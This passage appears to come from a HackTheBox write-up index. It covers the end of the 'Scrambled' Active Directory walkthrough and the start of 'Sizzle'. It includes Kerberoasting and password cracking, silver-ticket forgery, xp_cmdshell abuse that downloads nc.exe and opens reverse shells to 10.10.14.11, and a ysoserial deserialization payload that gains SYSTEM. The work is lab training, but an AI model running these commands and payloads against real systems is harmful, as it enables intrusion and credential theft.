Skipping...\n$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$7e6ce0425e0f83246932a0d054edb65b$39b6c747a1fad03b191151ca4c0a9a88fb7650fd66cd9b6876212313360e43091f01c0a044ea37d9dac3e92b43b505f3b99f7911a7d60e46f883ebdbf1d42102db4d0bb339100eb49b52d6cbfde18f187fd4266941eb021d6f2f58afae2e42f17ebbbe9357bfbba2b95ad2d2898146af9c3077e4dbfd1063258b42b60c3ae46c6db355b756a585888ab0a7ba95a18514a492676a2878038dd193f3cf17c0e8d3c59a8f2ef1308ab27ed0e812fd77532bb0deea3f2f2c65b855f73235157192010bb1b1f75f4cf09f0eae9a31a1c8441707955fa6cd1db6afcc826216580194442cf0f3ed7a52e953b650196fb3efa88696abc24bf51a7f48728fdaff6bb08b8bd424607697d63db87e097b9cefd0b1c2bf69177535e491f2c9b0c6a7d0fce2b9479f1c7a5c406f7fe3a4badc9ea1905da9791a08b6d1496e3a4eb4ffa8ef28be956403cdc54312726a9131f7ae245d79d9bb6cdaeeca49b96bf0a2bef6bc7aff4d87e39bb13ee5105e6f846fff9ec874a9bf3277f3848585a876a56b978b71d0d3e35134f4ab60e2c398fbb6eae65370566043a9dda932a8f5b187c5b409523a00fffc33c655a91422b41d9d7686b7f28668614170a1a1f890ddf0b2f38abd323f7b3907c5bcc5d94f2400ff85bf3d21e3dcc3211bc2ad6c07512a5198438c33ac33031a17efa86f6cc5ca71a84b06d6d09837b6a906393d35dac60ca60cc11b99481bb5deb60df8fa07af065b996eb47a56a1d3882fe7aa8790dc59294a68c24f2ea145660c26e67ec5c0d18d08b1b88715f216c95617b036ed28ff077c57da841ac004d79377ec06e60d09cdf66e124447734799973317bd90b67dfe7988197fb444ad8787755d291bf5b1f5b7e29e0e263a23b9a25994a9b3aa419cbfb2d3aee9ecdc6dcde4aa55e45750eb795c2223052ace4ec052cfe00606e5595051b1e58d9ea78c623c7bad41b9f698f95411d9d22a0bae3c7d58eace2bf70c4b24ee8a30d50f3e797b6fc619a3af9550cd2c966de81e79465f552b78f1cb4fb12887068af662ed5bee38d6ed4a33ffd6d06ad6f6e1526ec30ee7b3d1a6e0b41c1cdf35b11b28eaf20cf5c477beb9faa83753178e8d6a3c5e56198145fecf6e1c05c8f5ab0bfa18b58662d9380f42a22c61e41cc6d2672b5816a2103930353d7cd25a5988f1efef0b31316eb6ed0deecca53bcc6e412e8e753645efc3d4dd8226b3d45d238c994f7ab3b11d6b3e097b852bf8592a6300e70573f649fa22619297e2c05526408e7973221818ce0b57cd28c1a17478f43df47c179e98d5b40e11515efafdbd61b0dc004f1550b3ab1ab3334e157fc7444d3c17bddb78afa37993afdbf7773a146e2242b190ac06e8f6fcb6e137f422a2f6926e1e8c3ef18c8f856af519bd9fc227fa4b4cfef9a4bd154bc7bf5752e9830c02688a1e3bcc8b\n</code></pre> <p>We have <code>sqlsvc</code> and, using <code>john</code>:</p> <pre><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash       \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nPegasus60        (?)     \n1g 0:00:00:08 DONE (2024-11-28 17:13) 0.1153g/s 1237Kp/s 1237Kc/s 1237KC/s Peguero..Pearce\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>So we have <code>sqlsvc:Pegasus60</code>. Let's try to connect to <code>mssql</code>.</p> <p>We have to connect using Kerberos, so we need the TGT. Now with <code>impacket-mssqlclient</code>:</p> <pre><code>$ KRB5CCNAME=/home/kali/scrambled/sqlsvc.ccache impacket-mssqlclient dc1.scrm.local -k   \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\\sqlsvc'.\n</code></pre> <p>We can't, so as we have service account credentials, we could try to forge a silver ticket.</p> <p>First, the domain SID:</p> <pre><code>$ impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n...\n             1827831105,\n             2542523200,\n        ] \nResourceGroupCount:              1 \nResourceGroupIds:               \n    [\n\n        RelativeId:                      572 \n        Attributes:                      536870919 ,\n    ] \nDomain SID: S-1-5-21-2743207045-1827831105-2542523200\n</code></pre> <p>The NTLM hash can be converted online: <code>B999A16500B87D17EC7F2E2A68778F05</code></p> <p></p> <p>The SPN of the service is <code>mssql</code>, which we can get with <code>GetUserSPNs</code>:</p> <pre><code>$ impacket-GetUserSPNs -dc-ip 10.10.11.168 scrm.local/ksimpson:ksimpson -request -k -dc-host dc1.scrm.local\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[-] CCache file is not found. Skipping...\nServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation \n----------------------------  ------  --------  --------------------------  --------------------------  ----------\nMSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2024-11-29 10:17:17.244732             \nMSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2024-11-29 10:17:17.244732\n</code></pre> <p>Forge the ticket:</p> <pre><code>$ impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local Administrator\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for scrm.local/Administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncAsRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncASRepPart\n[*] Saving ticket in Administrator.ccache\n</code></pre> <p>Now we can enter <code>mssql</code> with <code>Administrator</code> credentials:</p> <pre><code>$ KRB5CCNAME=Administrator.ccache impacket-mssqlclient dc1.scrm.local -k  \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC1): Line 1: Changed database context to 'master'.\n[*] INFO(DC1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (SCRM\\administrator  dbo@master)&gt; \n</code></pre> <p>Inside the DB, we have credentials:</p> <pre><code>SQL (SCRM\\administrator  dbo@master)&gt; enum_db\nname         is_trustworthy_on   \n----------   -----------------   \nmaster                       0   \n\ntempdb                       0   \n\nmodel                        0   \n\nmsdb                         1   \n\nScrambleHR                   0   \n\nSQL (SCRM\\administrator  dbo@master)&gt; use ScrambleHR\nENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR\nINFO(DC1): Line 1: Changed database context to 'ScrambleHR'.\nSQL (SCRM\\administrator  dbo@ScrambleHR)&gt; select * from scramblehr.information_schema.tables;\nTABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   \n-------------   ------------   ----------   ----------   \nScrambleHR      dbo            Employees    b'BASE TABLE'   \n\nScrambleHR      dbo            UserImport   b'BASE TABLE'   \n\nScrambleHR      dbo            Timesheets   b'BASE TABLE'   \n\nSQL (SCRM\\administrator  dbo@ScrambleHR)&gt; select * from Employees;\nEmployeeID   FirstName   Surname   Title   Manager   Role   \n----------   ---------   -------   -----   -------   ----   \nSQL (SCRM\\administrator  dbo@ScrambleHR)&gt; select * from UserImport;\nLdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   \n--------   -----------------   ----------   ---------------   -------------   \nMiscSvc    ScrambledEggs9900   scrm.local                90               0  \n</code></pre> <p><code>MiscSvc:ScrambledEggs9900</code></p> <p>We can execute shells if we enable <code>xp_cmdshell</code> and, using <code>xp_cmdshell 'cmd'</code>, we can do a reverse shell.</p> <pre><code>SQL (SCRM\\administrator  dbo@master)&gt; enable_xp_cmdshell\nINFO(DC1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.\nINFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement tstall.\nSQL (SCRM\\administrator  dbo@master)&gt; xp_cmdshell \"certutil -urlcache -split -f http://10.10.14.11/nc.exe C:p\\nc.exe\"\noutput                                                \n---------------------------------------------------   \n****  Online  ****                                    \n\n  0000  ...                                           \n\n  e800                                                \n\nCertUtil: -URLCache command completed successfully.   \n\nNULL                                                  \n\n\nSQL (SCRM\\administrator  dbo@master)&gt; xp_cmdshell \"C:\\Temp\\nc.exe -e cmd 10.10.14.11 443\"\n</code></pre> <pre><code>$ nc -lnvp 443            \nlistening on [any] 443 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 49597\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nscrm\\sqlsvc\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"scrambled/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>C:\\Users&gt;powershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users&gt; $pass=ConvertTo-SecureString \"ScrambledEggs9900\" -AsPlainText -Force\n$pass=ConvertTo-SecureString \"ScrambledEggs9900\" -AsPlainText -Force\nPS C:\\Users&gt; $cred=New-Object System.Management.Automation.PSCredential(\"scrm.local\\MiscSvc\", $pass)\n$cred=New-Object System.Management.Automation.PSCredential(\"scrm.local\\MiscSvc\", $pass)\nPS C:\\Users&gt; Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }\nInvoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }\nscrm\\miscsvc\nPS C:\\Users&gt; Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C:\\Temp\\nc.exe -e cmd 10.10.14.11 444 }\nInvoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C:\\Temp\\nc.exe -e cmd 10.10.14.11 444 }\n</code></pre> <pre><code>$ nc -lnvp 444           \nlistening on [any] 444 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 64158\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\miscsvc\\Documents&gt;whoami\nwhoami\nscrm\\miscsvc\n</code></pre> <p>As this user, we can execute commands as the new user we found in the database and get another reverse shell.</p> <pre><code>$ nc -lnvp 444           \nlistening on [any] 444 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 64158\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\miscsvc\\Documents&gt;whoami\nwhoami\nscrm\\miscsvc\n\nC:\\Users\\miscsvc\\Desktop&gt;type user.txt\ntype user.txt\n25410e6a43413a693bdea407429f67ed\n</code></pre> <p>With this new user, we can re-enumerate SMB shares. Now we can enter the <code>IT</code> folder, and there is the web tutorial app from before here.</p> <pre><code>$ impacket-smbclient scrm.local/MiscSvc:ScrambledEggs9900@dc1.scrm.local -k\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\nType help for list of commands\n# shares\nADMIN$\nC$\nHR\nIPC$\nIT\nNETLOGON\nPublic\nSales\nSYSVOL\n# use IT\n# ls\ndrw-rw-rw-          0  Wed Nov  3 20:32:55 2021 .\ndrw-rw-rw-          0  Wed Nov  3 20:32:55 2021 ..\ndrw-rw-rw-          0  Wed Nov  3 22:06:32 2021 Apps\ndrw-rw-rw-          0  Wed Nov  3 20:32:44 2021 Logs\ndrw-rw-rw-          0  Wed Nov  3 20:32:55 2021 Reports\n# cd Apps\n# ls\ndrw-rw-rw-          0  Wed Nov  3 22:06:32 2021 .\ndrw-rw-rw-          0  Wed Nov  3 22:06:32 2021 ..\ndrw-rw-rw-          0  Fri Nov  5 21:57:08 2021 Sales Order Client\n# cd Sales Order Client\n# ls\ndrw-rw-rw-          0  Fri Nov  5 21:57:08 2021 .\ndrw-rw-rw-          0  Fri Nov  5 21:57:08 2021 ..\n-rw-rw-rw-      86528  Fri Nov  5 21:57:08 2021 ScrambleClient.exe\n-rw-rw-rw-      19456  Fri Nov  5 21:57:08 2021 ScrambleLib.dll\n# get ScrambleClient.exe\n# get ScrambleLib.dll\n# ls\ndrw-rw-rw-          0  Fri Nov  5 21:57:08 2021 .\ndrw-rw-rw-          0  Fri Nov  5 21:57:08 2021 ..\n-rw-rw-rw-      86528  Fri Nov  5 21:57:08 2021 ScrambleClient.exe\n-rw-rw-rw-      19456  Fri Nov  5 21:57:08 2021 ScrambleLib.dll\n# exit\n</code></pre> <p>We'll open this with a .NET debugger to search for useful information.</p> <p></p> <p>There is a username for instant access to the app. Let's try to connect (remember to add <code>scrm.local</code> to hosts in Windows).</p> <p></p> <p>We create a new order and check the logs.</p> <p></p> <p>We see that the orders are being base64-encoded to the server. If we can send an order to port <code>4411</code> with a payload, maybe it gets executed. https://github.com/frohoff/ysoserial</p> <p>So we can use <code>UPLOAD_ORDER;&lt;serialized payload&gt;</code></p> <pre><code>C:\\Users\\krovs\\Downloads\\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\\Release&gt;ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 -c \"C:\\Temp\\nc.exe -e cmd 10.10.14.11 443\"\nAAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMUFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHhNU0EwTkRNaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==\n</code></pre> <pre><code>$ nc dc1.scrm.local 4411\nSCRAMBLECORP_ORDERS_V1.0.3;\nUPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjMMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMTDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHhNU0EwTkRNaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1PbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1\nERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.\n</code></pre> <pre><code>$ nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 62576\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"scrambled/#post-exploitation","title":"Post Exploitation","text":"<pre><code>C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n6bd97f1d5ed34982faa14e355e8f3c52\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sizzle/","title":"Sizzle","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"sizzle/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.103\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 09:36 CET\nNmap scan report for 10.10.10.103\nHost is up (0.043s latency).\nNot shown: 65507 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Site doesn't have a title (text/html).\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=sizzle.htb.local\n| Not valid before: 2018-07-03T17:58:55\n|_Not valid after:  2020-07-02T17:58:55\n|_ssl-date: 2024-11-24T08:38:38+00:00; +1s from scanner time.\n443/tcp   open  ssl/http      Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_ssl-date: 2024-11-24T08:38:38+00:00; 0s from scanner time.\n| tls-alpn: \n|   h2\n|_  http/1.1\n| ssl-cert: Subject: commonName=sizzle.htb.local\n| Not valid before: 2018-07-03T17:58:55\n|_Not valid after:  2020-07-02T17:58:55\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesn't have a title (text/html).                                                   \n445/tcp   open  microsoft-ds?                                                                          \n464/tcp   open  kpasswd5?                                                                              \n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                      \n636/tcp   open  ssl/ldap                                                                               \n|_ssl-date: 2024-11-24T08:38:37+00:00; 0s from scanner time.                                           \n| ssl-cert: Subject: commonName=sizzle.htb.local                                                       \n| Not valid before: 2018-07-03T17:58:55                                                                \n|_Not valid after:  2020-07-02T17:58:55                                                                \n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)                                                                                      \n| ssl-cert: Subject: commonName=sizzle.htb.local                                                       \n| Not valid before: 2018-07-03T17:58:55                                                                \n|_Not valid after:  2020-07-02T17:58:55                                                                \n|_ssl-date: 2024-11-24T08:38:38+00:00; +1s from scanner time.                                          \n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)                                                                                      \n| ssl-cert: Subject: commonName=sizzle.htb.local                                                       \n| Not valid before: 2018-07-03T17:58:55                                                                \n|_Not valid after:  2020-07-02T17:58:55                                                                \n|_ssl-date: 2024-11-24T08:38:37+00:00; 0s from scanner time.                                           \n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                  \n|_http-server-header: Microsoft-HTTPAPI/2.0                                                            \n|_http-title: Not Found                                                                                \n5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                  \n|_ssl-date: 2024-11-24T08:38:38+00:00; 0s from scanner time.                                           \n|_http-server-header: Microsoft-HTTPAPI/2.0                                                            \n| tls-alpn:                                                                                            \n|   h2                                                                                                 \n|_  http/1.1                                                                                           \n|_http-title: Not Found                                                                                \n| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL                                                       \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL       \n| Not valid before: 2018-07-02T20:26:23                                                                \n|_Not valid after:  2019-07-02T20:26:23                                                                \n9389/tcp  open  mc-nmf        .NET Message Framing                                                     \n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                  \n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49691/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49696/tcp open  msrpc         Microsoft Windows RPC\n49711/tcp open  msrpc         Microsoft Windows RPC\n49730/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-11-24T08:37:59\n|_  start_date: 2024-11-24T08:35:18\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 128.59 seconds\n</code></pre> <p>Ftp is empty after entering with anonymous session.</p> <p>The web server has a web page with bacon.</p> <p></p> <p>Let's fuzz the directory for new paths; nothing.</p> <p>In <code>smb</code> there is a share with empty access. Inside, there are a bunch of media files and directories with user names. Let's kerbrute these names.</p> <pre><code>$ sudo mount -t cifs //10.10.10.103/Department\\ shares mount -o domain=htb.local\nPassword for root@//10.10.10.103/Department shares: \n\n$ tree              \n.\n\u251c\u2500\u2500 Accounting\n\u251c\u2500\u2500 Audit\n\u251c\u2500\u2500 Banking\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Offshore\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Clients\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Data\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Dev\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Plans\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 Sites\n\u251c\u2500\u2500 CEO_protected\n\u251c\u2500\u2500 Devops\n\u251c\u2500\u2500 Finance\n\u251c\u2500\u2500 HR\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Benefits\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Corporate Events\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 New Hire Documents\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 Payroll\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Policies\n\u251c\u2500\u2500 Infosec\n\u251c\u2500\u2500 Infrastructure\n\u251c\u2500\u2500 IT\n\u251c\u2500\u2500 Legal\n\u251c\u2500\u2500 M&amp;A\n\u251c\u2500\u2500 Marketing\n\u251c\u2500\u2500 R&amp;D\n\u251c\u2500\u2500 Sales\n\u251c\u2500\u2500 Security\n\u251c\u2500\u2500 Tax\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2010\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2011\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2012\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2013\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2014\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2015\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2016\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 2017\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 2018\n\u251c\u2500\u2500 Users\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 amanda\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 amanda_adm\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bill\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bob\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 chris\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 henry\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 joe\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 